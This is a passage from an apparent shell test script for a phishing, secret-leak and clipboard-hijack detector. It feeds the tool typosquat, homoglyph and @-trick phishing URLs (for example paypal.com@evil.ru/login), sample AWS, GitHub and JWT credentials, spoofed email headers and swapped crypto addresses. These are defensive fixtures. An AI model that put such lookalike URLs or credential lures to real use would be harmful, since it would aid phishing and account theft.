    && check "canonical: typosquat shows real discord domain" "0" "0" \
    || check "canonical: typosquat shows real discord domain" "0" "1"
# Homoglyph: canonical appears alongside the substitution warning.
./hlse_core "https://paypa1.com/signin" 2>&1 | grep -qi "Legitimate 'paypal': paypal.com" \
    && check "canonical: homoglyph shows real paypal domain" "0" "0" \
    || check "canonical: homoglyph shows real paypal domain" "0" "1"
# Brand impersonation: hyphen+security-word gets canonical.
./hlse_core "https://paypal-verify.xyz/login" 2>&1 | grep -qi "Legitimate 'paypal': paypal.com" \
    && check "canonical: brand impersonation shows canonical" "0" "0" \
    || check "canonical: brand impersonation shows canonical" "0" "1"
# Non-obvious canonical: zoom.us not zoom.com.
./hlse_core "https://paypa1.zoom.us.attacker.com/meeting" 2>&1 | grep -qi "Legitimate 'zoom': zoom.us" \
    && check "canonical: subdomain spoofing shows zoom.us (not zoom.com)" "0" "0" \
    || check "canonical: subdomain spoofing shows zoom.us (not zoom.com)" "0" "1"
# Dedup: when two brand detectors fire on the same brand, the canonical line
# appears exactly once (not duplicated).
CANON_DUPS=$(./hlse_core "https://paypal.evilsite.netlify.app/signin" 2>&1 \
    | grep -c "Legitimate 'paypal': paypal.com")
check "canonical: dedup → single canonical line for repeated brand" "1" "$CANON_DUPS"
# JSON: canonical reason appears in reasons array.
if command -v python3 >/dev/null 2>&1; then
    CANON_JSON=""; CANON_JSON=$(./hlse_core --json "https://discordd.com/login" 2>/dev/null) || true
    echo "$CANON_JSON" | python3 -c "
import json,sys
d=json.loads(sys.stdin.read())
found=any('discord.com' in r for r in d.get('reasons',[]))
raise SystemExit(0 if found else 1)
" 2>/dev/null \
        && check "canonical: JSON reasons contain canonical domain" "0" "0" \
        || check "canonical: JSON reasons contain canonical domain" "0" "1"
fi

# ─── Attack pattern synthesis ────────────────────────────────────────
# Typosquat + phishing path → "typosquat credential-harvest page"
./hlse_core "https://discordd.com/login" 2>&1 | grep -qi "Pattern:.*typosquat" \
    && check "pattern: typosquat+path → typosquat credential-harvest page" "0" "0" \
    || check "pattern: typosquat+path → typosquat credential-harvest page" "0" "1"
# IDN homograph → "Unicode/IDN homograph impersonation"
./hlse_core "https://xn--pple-43d.com" 2>&1 | grep -qi "Pattern:.*IDN\|Pattern:.*Unicode" \
    && check "pattern: IDN homograph → Unicode/IDN classification" "0" "0" \
    || check "pattern: IDN homograph → Unicode/IDN classification" "0" "1"
# Brand-hyphen + suspicious TLD + path → "brand-hyphen credential-harvest page"
./hlse_core "https://paypal-verify.xyz/login" 2>&1 | grep -qi "Pattern:.*brand.*hyphen\|Pattern:.*hyphen.*brand" \
    && check "pattern: brand-hyphen+TLD+path → brand-hyphen credential-harvest" "0" "0" \
    || check "pattern: brand-hyphen+TLD+path → brand-hyphen credential-harvest" "0" "1"
# @ authority trick → "authority-trick credential phishing"
./hlse_core "https://www.paypal.com@evil.ru/login" 2>&1 | grep -qi "Pattern:.*authority" \
    && check "pattern: @ authority trick → authority-trick phishing" "0" "0" \
    || check "pattern: @ authority trick → authority-trick phishing" "0" "1"
# URL shortener → "obfuscated link" pattern
./hlse_core "https://bit.ly/3AbCdEf" 2>&1 | grep -qi "Pattern:.*obfuscat\|Pattern:.*shortener" \
    && check "pattern: shortener → obfuscated link classification" "0" "0" \
    || check "pattern: shortener → obfuscated link classification" "0" "1"
# Clean URL must NOT have a Pattern line
./hlse_core "https://www.google.com" 2>&1 | grep -qi "Pattern:" \
    && check "pattern: clean URL has no Pattern line" "0" "1" \
    || check "pattern: clean URL has no Pattern line" "0" "0"
# JSON output includes 'pattern' field for threat URLs
if command -v python3 >/dev/null 2>&1; then
    PAT_JSON=""; PAT_JSON=$(./hlse_core --json "https://discordd.com/login" 2>/dev/null) || true
    echo "$PAT_JSON" | python3 -c "
import json,sys
d=json.loads(sys.stdin.read())
raise SystemExit(0 if 'pattern' in d else 1)
" 2>/dev/null \
        && check "pattern: JSON includes 'pattern' field for threat URL" "0" "0" \
        || check "pattern: JSON includes 'pattern' field for threat URL" "0" "1"
fi

# ─── JSON control-char escaping ─────────────────────────────────────
# A secret file containing a control byte must still produce valid JSON
# (the \uXXXX escape path).
if command -v python3 >/dev/null 2>&1; then
    JE_DIR=$(mktemp -d)
    printf 'secret\x01ctrl = AKIA2E3MWORQXYZ4567PQ\n' > "$JE_DIR/c.env"
    ./hlse_core --json scan "$JE_DIR" 2>/dev/null | \
        python3 -c "import json,sys; [json.loads(l) for l in sys.stdin if l.strip()]" 2>/dev/null \
        && check "JSON: control char → valid \\uXXXX escape" "0" "0" \
        || check "JSON: control char → valid \\uXXXX escape" "0" "1"
    rm -rf "$JE_DIR"
fi

# ─── secret / email / clipboard subcommands (CLI exposure of library) ─

# secret: detects a leaked key from an argument
./hlse_core secret "aws_access_key_id = AKIA2E3MWORQXYZ4567PQ" 2>&1 \
    | grep -qE "AWS|ISOLATE|BLOCK" \
    && check "secret: detects AWS key (arg)" "0" "0" \
    || check "secret: detects AWS key (arg)" "0" "1"

# confidence: a fixed-prefix key is reported as 'certain'
./hlse_core secret "AKIA2E3MWORQXYZ4567PQ" 2>&1 | grep -q "confidence: certain" \
    && check "confidence: fixed-prefix key → certain" "0" "0" \
    || check "confidence: fixed-prefix key → certain" "0" "1"

# confidence: a generic VAR=value is reported as 'heuristic' (a pattern guess)
./hlse_core secret "PASSWORD=please-knock-first" 2>&1 | grep -q "confidence: heuristic" \
    && check "confidence: generic env var → heuristic" "0" "0" \
    || check "confidence: generic env var → heuristic" "0" "1"

# confidence: JSON exposes the 'confidence' field
./hlse_core --json secret "PASSWORD=hunter2value" 2>&1 | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert d["confidence"] in ("certain","heuristic")
' && check "confidence: JSON secret has confidence field" "0" "0" \
   || check "confidence: JSON secret has confidence field" "0" "1"

# remediation: an actionable verdict (>=60) carries a next-action directive
./hlse_core clipboard "1A1zP1eP5QGefi2DMPTfTL5SLmv7Divf" "1BoatSLRHtKNngkdXEeobR76b53LETtpyT" 2>&1 \
    | grep -q "Action:" \
    && check "remediation: clipboard hijack shows next-action" "0" "0" \
    || check "remediation: clipboard hijack shows next-action" "0" "1"

# remediation: JSON exposes a 'remediation' field on an actionable secret
./hlse_core --json secret "AKIA2E3MWORQXYZ4567PQ" 2>&1 | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert d["score"] >= 60 and d.get("remediation")
' && check "remediation: JSON secret has remediation field" "0" "0" \
   || check "remediation: JSON secret has remediation field" "0" "1"

# remediation: a sub-threshold (LOG) verdict must NOT carry an action line
./hlse_core email "From: a@b.com
Reply-To: c@d.com
Subject: hello" 2>&1 | grep -q "Action:" \
    && check "remediation: LOG verdict has no action line" "0" "1" \
    || check "remediation: LOG verdict has no action line" "0" "0"

# secret: reads from stdin
printf 'token: ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij\n' \
    | ./hlse_core secret --stdin 2>&1 | grep -q "GitHub" \
    && check "secret: detects from stdin" "0" "0" \
    || check "secret: detects from stdin" "0" "1"

# secret: clean text → exit 0
./hlse_core secret "just some normal prose" >/dev/null 2>&1
check "secret: clean text exits 0" "0" "$?"

# secret: leaked key → exit 1
./hlse_core secret "key=AKIA2E3MWORQXYZ4567PQ" >/dev/null 2>&1 && rc=0 || rc=$?
check "secret: leaked key exits 1" "1" "$rc"

# secret: no-arg → exit 2 (usage error; must not treat non-tty CI stdin as input)
./hlse_core secret </dev/null >/dev/null 2>&1 && rc=0 || rc=$?
check "secret: no-arg exits 2" "2" "$rc"

# secret: JSON parseable with findings
./hlse_core --json secret "key=AKIA2E3MWORQXYZ4567PQ" 2>&1 | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert d["kind"] == "secret" and "findings" in d
' && check "--json secret parseable" "0" "0" \
   || check "--json secret parseable" "0" "1"

# secret: signed JWT bearer token detected
./hlse_core secret "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c" 2>&1 | grep -qi "JWT" \
    && check "secret: signed JWT bearer token → detected" "0" "0" \
    || check "secret: signed JWT bearer token → detected" "0" "1"

# secret FP guard: unsigned 2-segment token must NOT be flagged as a JWT
./hlse_core secret "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0" 2>&1 | grep -qi "JWT" \
    && check "secret: unsigned 2-segment token NOT flagged" "0" "1" \
    || check "secret: unsigned 2-segment token NOT flagged" "0" "0"

# secret: AWS credentials file format (lowercase keys + spaces around '=')
./hlse_core secret "aws_secret_access_key = wJalrXUtnFEMItesting7bPxRfiCYzABCD1234567" 2>&1 | grep -qi "AWS secret" \
    && check "secret: AWS creds-file (lowercase+spaces) → detected" "0" "0" \
    || check "secret: AWS creds-file (lowercase+spaces) → detected" "0" "1"

# secret FP guard: a placeholder AWS secret value must NOT be flagged
./hlse_core secret "aws_secret_access_key = YOUR_SECRET_KEY_HERE_PLACEHOLDER_XXXXXXX" 2>&1 | grep -qi "AWS secret" \
    && check "secret: placeholder AWS secret NOT flagged" "0" "1" \
    || check "secret: placeholder AWS secret NOT flagged" "0" "0"

# secret: Google OAuth client secret (GOCSPX- prefix)
./hlse_core secret "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" 2>&1 | grep -qi "OAuth Client Secret" \
    && check "secret: Google OAuth client secret → detected" "0" "0" \
    || check "secret: Google OAuth client secret → detected" "0" "1"

# secret: DB connection string with embedded password
./hlse_core secret "postgres://admin:Sup3rS3cr3tP4ss@db.internal.com:5432/maindb" 2>&1 | grep -qi "Embedded credentials" \
    && check "secret: DB URI with embedded password → detected" "0" "0" \
    || check "secret: DB URI with embedded password → detected" "0" "1"

# secret FP guard: a connection string with a ${VAR} password must NOT be flagged
./hlse_core secret 'postgres://admin:${DB_PASS}@db.com/main' 2>&1 | grep -qi "Embedded credentials" \
    && check "secret: URI with \${VAR} password NOT flagged" "0" "1" \
    || check "secret: URI with \${VAR} password NOT flagged" "0" "0"

# secret: newer LLM-provider keys (Groq / Perplexity / xAI distinctive prefixes)
./hlse_core secret "gsk_abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJ" 2>&1 | grep -qi "Groq" \
    && check "secret: Groq API key → detected" "0" "0" \
    || check "secret: Groq API key → detected" "0" "1"
./hlse_core secret "pplx-abcdef0123456789abcdef0123456789abcdef0123" 2>&1 | grep -qi "Perplexity" \
    && check "secret: Perplexity API key → detected" "0" "0" \
    || check "secret: Perplexity API key → detected" "0" "1"
# FP guard: a short 'xai-' word must NOT be flagged (min 20-char body)
./hlse_core secret "the file is in xai-dir folder" 2>&1 | grep -qi "xAI" \
    && check "secret: short xai- word NOT flagged" "0" "1" \
    || check "secret: short xai- word NOT flagged" "0" "0"

# secret: bare Telegram bot token (<8-10 digits>:<35 base64url>)
./hlse_core secret "7123456789:AAH1234567890abcdefghijklmnopqrstuvw" 2>&1 | grep -qi "Telegram" \
    && check "secret: bare Telegram bot token → detected" "0" "0" \
    || check "secret: bare Telegram bot token → detected" "0" "1"

# secret FP guard: timestamps/ports must NOT be flagged as a Telegram token
./hlse_core secret "Server on 192.168.1.1:8080 since 12:34:56 today" 2>&1 | grep -qi "Telegram" \
    && check "secret: time/port NOT flagged as Telegram token" "0" "1" \
    || check "secret: time/port NOT flagged as Telegram token" "0" "0"

# email: display-name spoof detected from stdin
printf 'From: Microsoft Support <hacker@gmail.com>\nSubject: Verify\n' \
    | ./hlse_core email --stdin 2>&1 | grep -qE "E1|microsoft|spoof|Display" \
    && check "email: display-name spoof detected" "0" "0" \
    || check "email: display-name spoof detected" "0" "1"

# email: no-arg → exit 2
./hlse_core email </dev/null >/dev/null 2>&1 && rc=0 || rc=$?
check "email: no-arg exits 2" "2" "$rc"

# email: JSON parseable
./hlse_core --json email "From: a@b.com" 2>&1 | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert d["kind"] == "email" and "reasons" in d
' && check "--json email parseable" "0" "0" \
   || check "--json email parseable" "0" "1"

# clipboard: same address → no swap (exit 0)
./hlse_core clipboard \
    "bc1qjaet6jgpk08la46jelmlpgsz84luc4lc0tnwr5" \
    "bc1qjaet6jgpk08la46jelmlpgsz84luc4lc0tnwr5" >/dev/null 2>&1
check "clipboard: identical address exits 0" "0" "$?"

# clipboard: swapped address → BLOCK (exit 1)
./hlse_core clipboard \
    "bc1qjaet6jgpk08la46jelmlpgsz84luc4lc0tnwr5" \
    "bc1q9h6tq358tcssvfjafy2dajfu7lk6f35c9cn3t2" >/dev/null 2>&1 && rc=0 || rc=$?
check "clipboard: swapped address exits 1" "1" "$rc"

# clipboard: JSON has is_swap
./hlse_core --json clipboard \
    "0xabcdef0000000000000000000000000000c0ffee" \
    "0xabcdef1111111111111111111111111111c0ffee" 2>&1 | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert d["kind"] == "clipboard" and d["is_swap"] == 1 and d["score"] == 100
' && check "--json clipboard vanity → score 100" "0" "0" \
   || check "--json clipboard vanity → score 100" "0" "1"

# ─── Advisory parity: the three URL output paths must not drift ─────────────
# print_url_advisories() centralises Pattern/Disguised/Objective/Safe/Verify/
# Triage so the stdin, `text` subcommand, and default paths cannot diverge.
# Compare the advisory lines (markers ▸ ⌖ ◉ → ✓ ⚑) across all three.
ADV_DEFAULT=$(./hlse_core "https://paypa1.com/login" 2>/dev/null | grep -E '▸|⌖|◉|→|✓|⚑')
ADV_TEXT=$(./hlse_core text "https://paypa1.com/login" 2>/dev/null | grep -E '▸|⌖|◉|→|✓|⚑')
ADV_STDIN=$(echo "https://paypa1.com/login" | ./hlse_core --stdin 2>/dev/null | grep -E '▸|⌖|◉|→|✓|⚑')
[ "$ADV_DEFAULT" = "$ADV_TEXT" ] \
    && check "advisory parity: default == text subcommand" "0" "0" \
    || check "advisory parity: default == text subcommand" "0" "1"
[ "$ADV_DEFAULT" = "$ADV_STDIN" ] \
    && check "advisory parity: default == stdin" "0" "0" \
    || check "advisory parity: default == stdin" "0" "1"

# ─── Perspective 16: Canonical confirmation ("positively confirmed safe") ───
# Socratic Q: "'OK' means 'nothing wrong found' — absence of evidence. But for
# a URL that exactly matches a canonical brand domain, HLSE has POSITIVE
# evidence of legitimacy. Why not say so explicitly?"

# Known canonical brand domain → emits Canonical confirmation
CAN_PAY=$(./hlse_core "https://paypal.com" 2>/dev/null)
echo "$CAN_PAY" | grep -q "Canonical: confirmed authentic paypal" \
    && check "canonical: paypal.com → confirmed" "0" "0" \
    || check "canonical: paypal.com → confirmed" "0" "1"

# www. prefix is stripped for matching
CAN_ZOOM=$(./hlse_core "https://www.zoom.us" 2>/dev/null)
echo "$CAN_ZOOM" | grep -q "Canonical: confirmed authentic zoom" \
    && check "canonical: www.zoom.us → confirmed (www stripped)" "0" "0" \
    || check "canonical: www.zoom.us → confirmed (www stripped)" "0" "1"

# Non-canonical clean URL → NO canonical line
CAN_NONE=$(./hlse_core "https://example.com" 2>/dev/null)
echo "$CAN_NONE" | grep -q "Canonical:" \
    && check "canonical: absent for non-brand URL" "0" "1" \
    || check "canonical: absent for non-brand URL" "0" "0"

# Threat URL (fake domain) → NO canonical confirmation (score > 0)
CAN_FAKE=$(./hlse_core "https://paypa1.com/login" 2>/dev/null) || true
echo "$CAN_FAKE" | grep -q "Canonical:" \
    && check "canonical: absent for threat URL" "0" "1" \
    || check "canonical: absent for threat URL" "0" "0"

# JSON emits canonical_brand for confirmed domains
CAN_JSON=$(./hlse_core --json "https://paypal.com" 2>/dev/null)
echo "$CAN_JSON" | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert d.get("canonical_brand") == "paypal", d
assert d.get("score") == 0, d
' && check "canonical json: canonical_brand=paypal" "0" "0" \
   || check "canonical json: canonical_brand=paypal" "0" "1"

# JSON omits canonical_brand for non-brand clean URL
CAN_JSON_NONE=$(./hlse_core --json "https://example.com" 2>/dev/null)
echo "$CAN_JSON_NONE" | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert "canonical_brand" not in d, d
' && check "canonical json: absent for non-brand URL" "0" "0" \
   || check "canonical json: absent for non-brand URL" "0" "1"

# stdin pipe mode emits canonical for a clean brand domain
CAN_STDIN=$(echo "https://paypal.com" | ./hlse_core --stdin 2>/dev/null)
echo "$CAN_STDIN" | grep -q "Canonical: confirmed authentic paypal" \
    && check "canonical stdin: confirmed shown" "0" "0" \
    || check "canonical stdin: confirmed shown" "0" "1"

# text subcommand OK-path also surfaces canonical confirmation (parity)
CAN_TEXT=$(./hlse_core text "https://paypal.com" 2>/dev/null)
echo "$CAN_TEXT" | grep -q "Canonical: confirmed authentic paypal" \
    && check "canonical: text subcommand → confirmed (parity)" "0" "0" \
    || check "canonical: text subcommand → confirmed (parity)" "0" "1"

# Non-obvious canonical (zoom.us, not zoom.com) is confirmed correctly
CAN_ZOOM_IO=$(./hlse_core "https://zoom.us" 2>/dev/null)
echo "$CAN_ZOOM_IO" | grep -q "Canonical: confirmed authentic zoom" \
    && check "canonical: zoom.us (non-obvious TLD) confirmed" "0" "0" \
    || check "canonical: zoom.us (non-obvious TLD) confirmed" "0" "1"

# ─── Perspective 15: Incident triage ("if you already clicked") ─────────────
# Socratic Q: "People typically notice something's wrong AFTER submitting
# credentials. At that moment 'BLOCK' is useless — they need triage: what to
# do in the next 60 seconds to minimise damage."

# BLOCK-band payment brand → financial card-block triage
TRI_PAY=$(./hlse_core "https://paypa1.com/login" 2>/dev/null) || true
echo "$TRI_PAY" | grep -q "If already clicked:" \
    && check "triage: BLOCK brand → triage line shown" "0" "0" \
    || check "triage: BLOCK brand → triage line shown" "0" "1"
echo "$TRI_PAY" | grep -q "card" \
    && check "triage: payment brand → card-block guidance" "0" "0" \
    || check "triage: payment brand → card-block guidance" "0" "1"

# BLOCK-band corporate SSO → IT-team notification triage
TRI_SSO=$(./hlse_core "https://okta-enterprise-login.com/signin" 2>/dev/null) || true
echo "$TRI_SSO" | grep -q "IT/security team" \
    && check "triage: corporate SSO → IT-team notification" "0" "0" \
    || check "triage: corporate SSO → IT-team notification" "0" "1"

# ALERT-band URL (<60) → NO triage line (band boundary must be respected)
TRI_ALERT=$(./hlse_core "https://g00gle.com" 2>/dev/null) || true
echo "$TRI_ALERT" | grep -q "If already clicked" \
    && check "triage: absent below score 60" "0" "1" \
    || check "triage: absent below score 60" "0" "0"

# Clean URL → no triage line
TRI_CLEAN=$(./hlse_core "https://example.com" 2>/dev/null) || true
echo "$TRI_CLEAN" | grep -q "If already clicked" \
    && check "triage: absent for clean URL" "0" "1" \
    || check "triage: absent for clean URL" "0" "0"

# Text input → no triage line
TRI_TXT=$(./hlse_core text "URGENT wire transfer now" 2>/dev/null) || true
echo "$TRI_TXT" | grep -q "If already clicked" \
    && check "triage: absent for text input" "0" "1" \
    || check "triage: absent for text input" "0" "0"

# JSON exposes the triage field for a BLOCK-band URL
TRI_JSON=""; TRI_JSON=$(./hlse_core --json "https://paypa1.com/login" 2>/dev/null) || true
echo "$TRI_JSON" | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert d.get("triage"), d
' && check "triage json: triage field present (BLOCK)" "0" "0" \
   || check "triage json: triage field present (BLOCK)" "0" "1"

# JSON omits triage for an ALERT-band URL
TRI_ALERT_JSON=""; TRI_ALERT_JSON=$(./hlse_core --json "https://g00gle.com" 2>/dev/null) || true
echo "$TRI_ALERT_JSON" | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert "triage" not in d, d
' && check "triage json: absent below score 60" "0" "0" \
   || check "triage json: absent below score 60" "0" "1"

# stdin pipe mode emits triage for a BLOCK-band URL
TRI_STDIN=$(echo "https://paypa1.com/login" | ./hlse_core --stdin 2>/dev/null) || true
echo "$TRI_STDIN" | grep -q "If already clicked:" \
    && check "triage stdin: triage line shown" "0" "0" \
    || check "triage stdin: triage line shown" "0" "1"

# ─── Perspective 14: Independent verification ("how to check me") ──────────
# Socratic Q: "What ONE check can the user run right now — without trusting
# HLSE — to confirm the verdict before they act?" High-confidence (>=60)
# mirror of exoneration (15..59); the two bands never overlap.

# BLOCK-band brand verdict → emits a Verify-independently check
VRF_BLOCK=$(./hlse_core "https://paypa1.com/login" 2>/dev/null) || true
echo "$VRF_BLOCK" | grep -q "Verify independently:" \
    && check "verify: BLOCK brand → verify line shown" "0" "0" \
    || check "verify: BLOCK brand → verify line shown" "0" "1"

# BLOCK band must NOT also show the low-band exoneration ("Could be benign")
echo "$VRF_BLOCK" | grep -q "Could be benign" \
    && check "verify: BLOCK band suppresses exoneration" "0" "1" \
    || check "verify: BLOCK band suppresses exoneration" "0" "0"

# ALERT-band verdict (<60) → NO verify line (exoneration band instead)
VRF_ALERT=$(./hlse_core "https://g00gle.com" 2>/dev/null) || true
echo "$VRF_ALERT" | grep -q "Verify independently" \
    && check "verify: absent below score 60" "0" "1" \
    || check "verify: absent below score 60" "0" "0"

# ALERT band still shows exoneration (the complementary band)
echo "$VRF_ALERT" | grep -q "Could be benign" \
    && check "verify: ALERT band keeps exoneration" "0" "0" \
    || check "verify: ALERT band keeps exoneration" "0" "1"

# Clean URL → no verify line
VRF_CLEAN=$(./hlse_core "https://example.com" 2>/dev/null) || true
echo "$VRF_CLEAN" | grep -q "Verify independently" \
    && check "verify: absent for clean URL" "0" "1" \
    || check "verify: absent for clean URL" "0" "0"

# JSON exposes the verify field for a BLOCK-band URL
VRF_JSON=""; VRF_JSON=$(./hlse_core --json "https://paypa1.com/login" 2>/dev/null) || true
echo "$VRF_JSON" | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert d.get("verify"), d
' && check "verify json: verify field present (BLOCK)" "0" "0" \
   || check "verify json: verify field present (BLOCK)" "0" "1"

# JSON omits verify for an ALERT-band URL
VRF_ALERT_JSON=""; VRF_ALERT_JSON=$(./hlse_core --json "https://g00gle.com" 2>/dev/null) || true
echo "$VRF_ALERT_JSON" | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert "verify" not in d, d
' && check "verify json: absent below score 60" "0" "0" \
   || check "verify json: absent below score 60" "0" "1"

# stdin pipe mode emits the verify line for a BLOCK-band URL
VRF_STDIN=$(echo "https://paypa1.com/login" | ./hlse_core --stdin 2>/dev/null) || true
echo "$VRF_STDIN" | grep -q "Verify independently:" \
    && check "verify stdin: verify line shown" "0" "0" \
    || check "verify stdin: verify line shown" "0" "1"

# ─── Perspective 13: Confusable forensics ("show the disguise") ────────────
# Socratic Q: "You said 'mixed-script homoglyph' and then showed the user the
# very string their eyes glossed over. Which exact character is the impostor?"

# Cyrillic homograph → pinpoints the disguised codepoint
CONF_CYR=$(./hlse_core "https://раypal.com" 2>/dev/null) || true
echo "$CONF_CYR" | grep -q "Disguised char: position 1 is Cyrillic U+0440" \
    && check "confusable: Cyrillic → U+0440 pinpointed" "0" "0" \
    || check "confusable: Cyrillic → U+0440 pinpointed" "0" "1"

# Pure-ASCII homoglyph (g00gle) → NO disguised-char line (all bytes are ASCII)
CONF_ASCII=$(./hlse_core "https://g00gle.com" 2>/dev/null) || true
echo "$CONF_ASCII" | grep -q "Disguised char" \
    && check "confusable: absent for pure-ASCII homoglyph" "0" "1" \
    || check "confusable: absent for pure-ASCII homoglyph" "0" "0"

# Clean ASCII URL → NO disguised-char line
CONF_CLEAN=$(./hlse_core "https://example.com" 2>/dev/null) || true
echo "$CONF_CLEAN" | grep -q "Disguised char" \
    && check "confusable: absent for clean URL" "0" "1" \
    || check "confusable: absent for clean URL" "0" "0"

# JSON exposes the confusable field for a mixed-script host
CONF_JSON=""; CONF_JSON=$(./hlse_core --json "https://раypal.com" 2>/dev/null) || true
echo "$CONF_JSON" | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert "Cyrillic" in d.get("confusable","") and "U+0440" in d.get("confusable",""), d
' && check "confusable json: field present" "0" "0" \
   || check "confusable json: field present" "0" "1"

# JSON omits confusable for a pure-ASCII host
CONF_ASCII_JSON=""; CONF_ASCII_JSON=$(./hlse_core --json "https://g00gle.com" 2>/dev/null) || true
echo "$CONF_ASCII_JSON" | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert "confusable" not in d, d
' && check "confusable json: absent for ASCII host" "0" "0" \
   || check "confusable json: absent for ASCII host" "0" "1"

# stdin pipe mode emits the disguised-char line too
CONF_STDIN=$(echo "https://раypal.com" | ./hlse_core --stdin 2>/dev/null) || true
echo "$CONF_STDIN" | grep -q "Disguised char: position 1 is Cyrillic" \
    && check "confusable stdin: disguised char shown" "0" "0" \
    || check "confusable stdin: disguised char shown" "0" "1"

# ─── Perspective 12: Attacker Objective ("what are they after?") ───────────
# Socratic Q: "You named HOW the attack works and WHERE to go instead — but
# never WHAT the attacker is after. Doesn't the stake decide how hard the user
# should care?"

# Crypto brand → irreversible-theft objective
OBJ_CRYPTO=$(./hlse_core "https://metamask-wallet.com/connect-wallet" 2>/dev/null) || true
echo "$OBJ_CRYPTO" | grep -q "Attacker's goal: crypto theft" \
    && check "objective: crypto brand → crypto theft" "0" "0" \
    || check "objective: crypto brand → crypto theft" "0" "1"

# Payment brand → financial-account-takeover objective
OBJ_PAY=$(./hlse_core "https://paypa1.com/login" 2>/dev/null) || true
echo "$OBJ_PAY" | grep -q "Attacker's goal: financial-account takeover" \
    && check "objective: payment brand → financial takeover" "0" "0" \
    || check "objective: payment brand → financial takeover" "0" "1"

# Identity brand → email/identity-keystone objective
OBJ_ID=$(./hlse_core "https://g00gle.com" 2>/dev/null) || true
echo "$OBJ_ID" | grep -q "Attacker's goal: email/identity takeover" \
    && check "objective: identity brand → identity takeover" "0" "0" \
    || check "objective: identity brand → identity takeover" "0" "1"

# Clean URL with no brand → no objective line
OBJ_CLEAN=$(./hlse_core "https://example.com" 2>/dev/null) || true
echo "$OBJ_CLEAN" | grep -q "Attacker's goal" \
    && check "objective: absent for clean URL" "0" "1" \
    || check "objective: absent for clean URL" "0" "0"

# Text input → no objective line
OBJ_TXT=$(./hlse_core text "URGENT wire transfer now" 2>/dev/null) || true
echo "$OBJ_TXT" | grep -q "Attacker's goal" \
    && check "objective: absent for text input" "0" "1" \
    || check "objective: absent for text input" "0" "0"

# JSON exposes the objective field for a brand-impersonation URL
OBJ_JSON=""; OBJ_JSON=$(./hlse_core --json "https://paypa1.com/login" 2>/dev/null) || true
echo "$OBJ_JSON" | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert "financial-account takeover" in d.get("objective",""), d
' && check "objective json: objective field present" "0" "0" \
   || check "objective json: objective field present" "0" "1"

# JSON omits objective when no brand is matched
OBJ_CLEAN_JSON=""; OBJ_CLEAN_JSON=$(./hlse_core --json "https://example.com" 2>/dev/null) || true
echo "$OBJ_CLEAN_JSON" | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert "objective" not in d, d
' && check "objective json: absent when clean" "0" "0" \
   || check "objective json: absent when clean" "0" "1"

# stdin pipe mode emits the objective too
OBJ_STDIN=$(echo "https://paypa1.com/login" | ./hlse_core --stdin 2>/dev/null) || true
echo "$OBJ_STDIN" | grep -q "Attacker's goal: financial-account takeover" \
    && check "objective stdin: objective shown" "0" "0" \
    || check "objective stdin: objective shown" "0" "1"

# ─── Perspective 11: Safe Destination ("did you mean") ─────────────────────
# Socratic Q: "You blocked the counterfeit — but the user still has the
# legitimate need. You already know the real domain. Shouldn't you hand it over
# so they don't re-search straight back into the same phishing net?"

# A brand-impersonation URL gets a navigable safe destination
SAFE_OUT=$(./hlse_core "https://paypa1.com/login" 2>/dev/null) || true
echo "$SAFE_OUT" | grep -q "Safe destination: https://paypal.com" \
    && check "safe-dest: typosquat → real domain" "0" "0" \
    || check "safe-dest: typosquat → real domain" "0" "1"

# Safe destination is a full navigable HTTPS URL (not a bare domain)
echo "$SAFE_OUT" | grep -qE "Safe destination: https://" \
    && check "safe-dest: emits https:// URL" "0" "0" \
    || check "safe-dest: emits https:// URL" "0" "1"

# A clean URL with no brand match gets NO safe destination line
CLEAN_OUT=$(./hlse_core "https://example.com" 2>/dev/null) || true
echo "$CLEAN_OUT" | grep -q "Safe destination" \
    && check "safe-dest: absent for clean URL" "0" "1" \
    || check "safe-dest: absent for clean URL" "0" "0"

# Text input (not a URL) never gets a safe destination
TXT_OUT=$(./hlse_core text "URGENT wire transfer now" 2>/dev/null) || true
echo "$TXT_OUT" | grep -q "Safe destination" \
    && check "safe-dest: absent for text input" "0" "1" \
    || check "safe-dest: absent for text input" "0" "0"

# JSON exposes safe_url for a brand-impersonation URL
SAFE_JSON=""; SAFE_JSON=$(./hlse_core --json "https://paypa1.com/login" 2>/dev/null) || true
echo "$SAFE_JSON" | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert d.get("safe_url") == "https://paypal.com", d
' && check "safe-dest json: safe_url field present" "0" "0" \
   || check "safe-dest json: safe_url field present" "0" "1"

# JSON omits safe_url when no brand is matched
CLEAN_JSON=""; CLEAN_JSON=$(./hlse_core --json "https://example.com" 2>/dev/null) || true
echo "$CLEAN_JSON" | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert "safe_url" not in d, d
' && check "safe-dest json: safe_url absent when clean" "0" "0" \
   || check "safe-dest json: safe_url absent when clean" "0" "1"

# stdin pipe mode emits the safe destination too
SAFE_STDIN=$(echo "https://paypa1.com/login" | ./hlse_core --stdin 2>/dev/null) || true
echo "$SAFE_STDIN" | grep -q "Safe destination: https://paypal.com" \
    && check "safe-dest stdin: real domain shown" "0" "0" \
    || check "safe-dest stdin: real domain shown" "0" "1"

# A homoglyph brand on a different brand resolves to that brand's real domain
SAFE_GOOG=$(./hlse_core "https://g00gle.com" 2>/dev/null) || true
echo "$SAFE_GOOG" | grep -q "Safe destination: https://google.com" \
